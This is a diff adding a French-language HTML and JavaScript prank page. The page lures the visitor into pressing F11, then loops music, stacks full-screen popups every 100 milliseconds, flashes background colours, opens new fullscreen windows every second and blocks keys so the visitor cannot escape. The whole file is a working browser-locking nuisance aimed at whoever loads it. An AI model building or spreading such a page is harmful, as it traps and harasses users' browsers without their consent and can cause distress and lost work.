@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plein écran, musique et désactivation totale des touches</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        /* #fullscreenButton {
+            width: 100vw;
+            height: 100vh;
+            background-color: white;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            cursor: pointer;
+        } */
+    </style>
+</head>
+<body>
+    <!-- <button id="fullscreenButton"></button> -->
+
+    <audio id="audioPlayer" loop>
+        <source src="HairUpJustinTimberlake.mp3" type="audio/mp3">
+        Votre navigateur ne supporte pas la balise audio.
+    </audio>
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script>
+        var start = false;
+ 
+        
+            
+
+
+    
+
+    
+
+    
+    
+    
+        
+        
+        const audioPlayer = document.getElementById('audioPlayer');
+
+
+        function playMusic() {
+            audioPlayer.play().catch((error) => {
+                console.log('Lecture automatique bloquée, veuillez interagir pour lancer la musique.');
+            });
+        }
+
+
+        function firstParams() {
+            const randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+            Swal.fire({
+            title: '',
+            text: '',
+            icon: 'warning',
+            showConfirmButton: false,
+            allowOutsideClick: false,
+            allowEscapeKey: false,
+            allowEnterKey: false,
+            backdrop: true,
+            position: 'center',
+            width: '100vw',
+            height: '90px',
+            customClass: {
+                popup: 'fullscreen-alert'
+            },
+            html: '<button id="closeButton" style="position: absolute; top: 10px; right: 10px;">Fermer</button>',
+            background: randomColor
+            });
+
+            document.getElementById('closeButton').addEventListener('click', () => {
+            Swal.close();
+            });
+
+            setTimeout(firstParams, 100); // Recall the function every second
+        }
+
+        function changeBackgroundColor() {
+            const randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+            document.body.style.backgroundColor = randomColor;
+         }
+        //
+        // const fullscreenButton = document.getElementById('fullscreenButton');
+        
+
+        // fullscreenButton.addEventListener('click', () => {
+        //     playMusic();
+        // });
+
+        // document.addEventListener('keydown', function (e) {
+        //     // if(e.keyCode != 27) {
+        //     //     e.preventDefault();
+        //     // }
+            
+        //     if (e.keyCode == 27) {
+        //         firstParams();
+        //     }
+        // }, false);
+
+
+        // fullscreenButton.addEventListener('click', () => {
+        //     playMusic();
+        // });
+        
+        // document.addEventListener('keydown', function (e) {
+        //     if(start == true) {
+        //     if (e.keyCode == 122) { // F11 key
+        //         e.preventDefault();
+        //     }
+        //     e.preventDefault();
+        // }
+        // }, false);
+
+        setInterval(() => {
+            if (start == true) {
+            const rightClickEvent = new MouseEvent('contextmenu', {
+                bubbles: true,
+                cancelable: true,
+                view: window,
+                button: 2
+            });
+            document.dispatchEvent(rightClickEvent);
+
+            window.open('musiq5.html', '_blank').addEventListener('load', () => {
+                        if (!document.fullscreenElement) {
+                            document.documentElement.requestFullscreen();
+                        }
+                    });
+            }
+        }, 1000);
+
+        
+        document.addEventListener('keydown', function (e) {
+            if (start == true) { // F11 key
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            } else {
+                e.preventDefault(); // Prevent exiting full screen
+            }
+        }
+    }, false);
+
+    
+            document.addEventListener('keydown', function (e) {
+                
+                
+
+                if(start == false){
+                    if(e.keyCode == 122) {
+                        Swal.close();
+                        playMusic();
+                        start = true;
+                        firstParams();
+                        return false;
+                    }
+                }
+                e.preventDefault(); // Empêche l'action par défaut de la touche
+            
+            }, false);
+
+
+            document.addEventListener('keydup', function (e) {
+                e.preventDefault(); // Empêche l'action par défaut de la touche
+            }, false);
+
+
+        document.addEventListener('mousemove', (event) => {
+                //firstParams();
+                if(start == true){
+                    changeBackgroundColor();
+                    event.preventDefault();
+                }
+        });
+
+        document.addEventListener('mousedown', (event) => {
+            if(start == true){
+                firstParams();
+                playMusic();
+                event.preventDefault();
+        }
+        });
+
+        document.addEventListener('mouseup', (event) => {
+            if(start == true){
+                firstParams();
+                playMusic();
+                event.preventDefault();
+            }
+        });
+        
+    
+
+
+    Swal.fire({
+                title: 'Appuyez sur F11 pour démarrer',
+                text: '',
+                icon: 'info',
+                showConfirmButton: false,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                allowEnterKey: false,
+                backdrop: true,
+                position: 'center',
+                width: '100vw',
+                height: '100vw',
+                customClass: {
+                    popup: 'fullscreen-alert'
+                },
+                background: '#ffffff'
+            });
+
+            // document.addEventListener('keydown', function (e) {
+            //     if (start == true) {
+            //         window.open('anotherpage.html', '_blank').addEventListener('load', () => {
+            //             if (!document.fullscreenElement) {
+            //                 document.documentElement.requestFullscreen();
+            //             }
+            //         });
+            //     }
+            // });
+            
+        
+    </script>
+
+</body>
+</html>
